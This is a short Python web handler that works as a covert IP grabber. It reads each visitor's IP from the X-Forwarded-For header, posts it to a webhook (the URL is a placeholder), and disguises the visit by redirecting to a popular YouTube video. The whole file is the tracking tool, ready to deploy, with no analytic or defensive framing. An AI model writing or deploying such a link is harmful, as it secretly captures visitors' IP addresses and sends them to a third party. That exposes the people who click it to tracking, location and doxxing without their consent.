from http.cookies import SimpleCookie

def handler(request, response):
    # Get IP from headers
    ip = request.headers.get("x-forwarded-for", "unknown").split(",")[0]

    # Send IP to webhook
    import requests
    webhook_url = "https://your-webhook-url.com"
    data = {"content": f"Visitor IP: {ip}"}
    requests.post(webhook_url, json=data)

    # Redirect to YouTube
    response.status_code = 302
    response.headers["Location"] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    return response
